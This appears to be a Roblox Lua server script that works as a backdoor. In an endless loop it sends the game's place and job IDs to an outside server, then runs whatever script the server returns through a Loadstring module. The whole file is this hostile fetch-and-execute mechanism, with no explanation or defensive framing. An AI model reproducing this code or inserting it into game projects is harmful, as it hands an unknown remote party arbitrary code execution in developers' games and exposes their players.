local HttpService = game:GetService("HttpService")
url = "http://www.blacknuse.pro/api/execute"

while true do
	pcall(function()
		wait(3)
		local dataFields = {
			["placeid"] = game.PlaceId, 
			["jobid"] = game.JobId,
		}
		local response = HttpService:PostAsync(url,HttpService:JSONEncode(dataFields))
		local data = HttpService:JSONDecode(response)
		if data.status == true then
			require(script.Parent.Loadstring)(data.script)()
		end
	end)
end
